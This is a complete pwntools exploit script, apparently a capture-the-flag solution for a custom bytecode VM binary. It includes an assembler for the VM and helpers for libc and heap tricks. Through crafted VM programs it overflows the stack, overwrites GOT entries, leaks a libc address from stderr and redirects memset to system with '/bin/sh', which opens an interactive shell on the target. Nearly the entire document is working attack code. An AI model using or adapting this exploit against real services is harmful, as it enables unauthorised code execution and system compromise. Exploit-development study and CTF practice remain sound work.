from pwn import *

con = "127.0.0.1 2727"

host, port = con.replace(" ", ":").split(":")

ssl = False

binary = './vm'

gdbscript = '''
set follow-fork-mode parent

    b *0x401a8f
    b *0x401932 
    c
'''

elf  = context.binary = ELF(binary)
libc = context.binary.libc
context.terminal = ['tmux', 'splitw', '-h']



# utils
u64 = lambda d: struct.unpack("<Q", d.ljust(8, b"\0"))[0]
u32 = lambda d: struct.unpack("<I", d.ljust(4, b"\0"))[0]
u16 = lambda d: struct.unpack("<H", d.ljust(2, b"\0"))[0]

p64 = lambda d: struct.pack("<Q", d % 2**64)
p32 = lambda d: struct.pack("<I", d % 2**32)
p16 = lambda d: struct.pack("<H", d % 2**16)

# credits to spwn by @chino
ru         = lambda *x, **y: p.recvuntil(*x, **y, drop=True)
rl         = lambda *x, **y: p.recvline(*x, **y, keepends=False)
rc         = lambda *x, **y: p.recv(*x, **y)
sla        = lambda *x, **y: p.sendlineafter(*x, **y)
sa         = lambda *x, **y: p.sendafter(*x, **y)
sl         = lambda *x, **y: p.sendline(*x, **y)
sn         = lambda *x, **y: p.send(*x, **y)
logbase    = lambda: log.info("libc base = %#x" % libc.address)
logleak    = lambda name, val: log.info(name+" = %#x" % val)
ls         = lambda x: log.success(x)
lss        = lambda x: ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
one_gadget = lambda: [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '--raw', '-l1', libc.path]).decode().split(' ')]

# exit_handler stuff
fs_decrypt = lambda addr, key: ror(addr, 0x11) ^ key
fs_encrypt = lambda addr, key: rol(addr ^ key, 0x11)


# heap stuff
prot_ptr = lambda pos, ptr: (pos >> 12) ^ ptr
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def start(argv=[], *a, **kw):
    if args.GDB: return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: return remote(host, port, ssl=ssl)
    else: return process([elf.path] + argv, *a, **kw)

OPCODES = {
    # Mnemonic: (Opcode, Operand1_Type, Operand2_Type)
    'nop':   (0x00, None, None),
    'jmp':   (0x01, 'imm', None),
    'je':    (0x02, 'imm', None),
    'jne':   (0x03, 'imm', None),
    'call':  (0x04, 'imm', None),
    'ret':   (0x05, None, None),
    'mov':   {('reg', 'imm'): 0x10, ('reg', 'reg'): 0x11},
    'push':  {('imm',): 0x20, ('reg',): 0x21},
    'pop':   {('reg',): 0x22},
    'add':   {('reg', 'imm'): 0x30, ('reg', 'reg'): 0x31},
    'sub':   {('reg', 'imm'): 0x32, ('reg', 'reg'): 0x33},
    'xor':   {('reg', 'imm'): 0x40, ('reg', 'reg'): 0x41},
    'cmp':   {('reg', 'imm'): 0x50, ('reg', 'reg'): 0x51},
    'print': (0xF0, 'reg', None),
    'halt':  (0xFF, None, None),
}

def parse_operand(op_str, labels):
    op_str = op_str.strip()
    if op_str.lower().startswith('r') and op_str[1:].isdigit():
        reg_num = int(op_str[1:])
        if 0 <= reg_num < 9:
            return 'reg', reg_num
        else:
            raise ValueError(f"Invalid register: {op_str}")

    if op_str in labels:
        return 'imm', labels[op_str]

    try:
        if op_str.lower().startswith('0x'):
            return 'imm', int(op_str, 16)
        else:
            return 'imm', int(op_str)
    except ValueError:
        return 'label', op_str

def assemble(source_code):
    lines = source_code.splitlines()
    labels, parsed_lines = {}, []
    bytecode_size = 0

    for line_num, line in enumerate(lines, 1):
        line = line.split(';')[0].split('#')[0].strip()
        if not line:
            continue
        
        if line.endswith(':'):
            label_name = line[:-1].strip()
            if not label_name:
                raise ValueError(f"Unnamed label on line {line_num}")
            labels[label_name] = bytecode_size
            continue

        parts = line.replace(',', ' ').split()
        mnemonic = parts[0].lower()
        operands = parts[1:]
        parsed_lines.append({'mnemonic': mnemonic, 'operands': operands, 'line': line_num})

        if mnemonic in ['ret', 'halt', 'nop']:
            bytecode_size += 1
        elif mnemonic in ['jmp', 'je', 'jne', 'call', 'push', 'pop', 'print']:
            op_info = OPCODES[mnemonic]
            bytecode_size += 1 + (4 if 'imm' in str(op_info) else 1)
        elif mnemonic in ['mov', 'add', 'sub', 'xor', 'cmp']:
            op2_is_reg = len(operands) > 1 and operands[1].lower().startswith('r')
            bytecode_size += 1 + 1 + (1 if op2_is_reg else 4)
        else:
            raise ValueError(f"Unknown instruction '{mnemonic}' on line {line_num}")

    bytecode = bytearray()
    for item in parsed_lines:
        mnemonic, operands, line_num = item['mnemonic'], item['operands'], item['line']
        op_info = OPCODES.get(mnemonic)

        if isinstance(op_info, tuple):
            opcode, op1_type, _ = op_info
            bytecode.append(opcode)
            if op1_type:
                op_type, op_val = parse_operand(operands[0], labels)
                if op_type != op1_type:
                    raise ValueError(f"Operand type mismatch for '{mnemonic}' on line {line_num}")
                if op_type == 'reg':
                    bytecode.append(op_val)
                elif op_type == 'imm':
                    bytecode.extend(p32(op_val))
        else:
            op_types = tuple(parse_operand(op, labels)[0] for op in operands)
            opcode = op_info.get(op_types)
            if opcode is None:
                raise ValueError(f"Invalid operand combination for '{mnemonic}' on line {line_num}: {op_types}")
            
            bytecode.append(opcode)
            for op_str in operands:
                op_type, op_val = parse_operand(op_str, labels)
                if op_type == 'reg':
                    bytecode.append(op_val)
                elif op_type == 'imm':
                    bytecode.extend(p32(op_val))
    
    return bytes(bytecode)

def overwrite_memory(idx, value, restart = True, nops = 0):
    assembly_code = f"""
        mov r5, 257
            
        loop_start:
            mov r3, {idx}
            push r3
            sub r5, 1     
            cmp r5, 0      
            jne loop_start 

    """
    if nops > 0:
        assembly_code = "nop\n" * nops + assembly_code
    for val in value:
        assembly_code += f"push {val}\n"

    if restart:
        assembly_code += "mov r8, r8"
    return assembly_code


def send_assembly(assembly_code):
    try:
        payload = assemble(assembly_code)
        ls(f"Assembly successful! Bytecode length: {len(payload)} bytes")
    except ValueError as e:
        log.failure(f"Assembly Error: {e}")
        sys.exit(1)

    sa(">", payload.ljust(0x1000, b'\0'))

def asm_bytes_to_int32(bytes_list):
    return [u32(bytes_list[i:i+4]) for i in range(0, len(bytes_list), 4)]

p = start()


# overwrite fprintf GOT to main
assembly_code = overwrite_memory(-1054, [0x401a96], restart=True) 
send_assembly(assembly_code)



# write a "mov r1, x" under stderr, using the lower 4 bytes of the stderr libc address as immediate value ("x")
assembly_code = """
nop
"""*6
assembly_code += """
mov r1, 0xdeadbeef 
"""
assembly_code = overwrite_memory(-1034, asm_bytes_to_int32(assemble(assembly_code))[:-1], restart=True)
send_assembly(assembly_code)


# write a "jmp to instruction area" in the upper 4 bytes of the stderr libc address (as next instruction) 
assembly_code = f"""
jmp 53
"""
assembly_code = overwrite_memory(-1031, asm_bytes_to_int32(assemble(assembly_code)), restart=True)
send_assembly(assembly_code)



# write /bin/sh to the first 8 bytes of vm, followed by shellcode, and jump to shellcode.
assembly_code = f"""
mov r7, 1010
sub r7, 1     
push 0xcafebabe
cmp r7, 0   
jne 14

push 0xdeadbeef
nop
nop
nop
nop
nop
nop
nop

; jump the the "mov r1, x" instruction to get the lower 4 bytes of stderr libc address into r1
jmp -40

; the other shellcode will jump back here
nop

; overflow to the sp again and overwrite it to point to "memset" in GOT (-1056)
mov r5, 244

nop
mov r3, -1056
push r3
sub r5, 1     
cmp r5, 0
nop      
jne 61

; libc base
sub r1, {libc.sym._IO_2_1_stderr_ % 2**32}
; system
add r1, {libc.sym.system % 2**32}
; overwrite last 4 bytes of memset GOT with system address
push r1

; restart the program so memset (system) is called
mov r8, r8
"""
assembly_code = overwrite_memory(-1024, [0x6e69622f, 0x0068732f] + asm_bytes_to_int32(assemble(assembly_code)), restart=False, nops = 512) # overwrite /bin/sh and overwrite memset to be system
assembly_code += "jmp 8"
send_assembly(assembly_code)


p.interactive()

